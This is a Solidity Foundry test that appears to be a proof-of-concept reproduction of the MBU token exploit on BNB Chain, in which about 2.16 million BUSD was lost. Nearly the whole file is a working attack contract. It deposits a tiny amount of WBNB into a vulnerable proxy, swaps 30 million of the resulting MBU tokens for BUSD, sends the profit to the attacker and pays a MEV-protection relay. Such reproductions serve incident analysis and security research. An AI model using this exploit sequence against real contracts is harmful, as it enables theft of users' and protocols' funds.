// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~2.16 M BUSD
// Original Attacker : https://bscscan.com/address/0xb32a53af96f7735d47f4b76c525bd5eb02b42600
// Attack Contract : https://bscscan.com/address/0x631adff068d484ce531fb519cda4042805521641
// Vulnerable Contract 0 : https://bscscan.com/address/0x95e92b09b89cf31fa9f1eca4109a85f88eb08531
// Vulnerable Contract 1 : https://bscscan.com/address/0x0dfb6ac3a8ea88d058be219066931db2bee9a581
// Attack Tx : https://bscscan.com/tx/0x2a65254b41b42f39331a0bcc9f893518d6b106e80d9a476b8ca3816325f4a150
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant BlockRazor = 0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20;

address constant MBU = 0x0dFb6Ac3A8Ea88d058bE219066931dB2BeE9A581;
address constant _0x95e9_ERC1967Proxy = 0x95e92B09b89cF31Fa9F1Eca4109A85F88EB08531;

contract MBUToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 49470430 - 1);
        vm.deal(attacker, 1 ether);
    }

    function testPoC() public {
        vm.startPrank(attacker);

        AttackerC attC = new AttackerC();
        
        attC.attack{value: 1 ether}();

        emit log_named_decimal_uint("Profit in BUSD", IERC20(BUSD).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    function attack() external payable {
        WETH9(payable(wbnb)).deposit{value: 0.001 ether}();

        IERC20(wbnb).approve(_0x95e9_ERC1967Proxy, 0.001 ether);

        I_0x95e9_ERC1967Proxy(_0x95e9_ERC1967Proxy).deposit(wbnb, 0.001 ether);

        IERC20(MBU).approve(router, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = MBU;
        path[1] = BUSD;
        IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            30_000_000 ether,
            0,
            path,
            address(this),
            block.timestamp
        );

        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));

        // Pay MEV Protected Transaction
        BlockRazor.call{value: 0.999 ether}("");
    }
}

interface I_0x95e9_ERC1967Proxy {
    function deposit(address, uint256) external returns(uint256);
}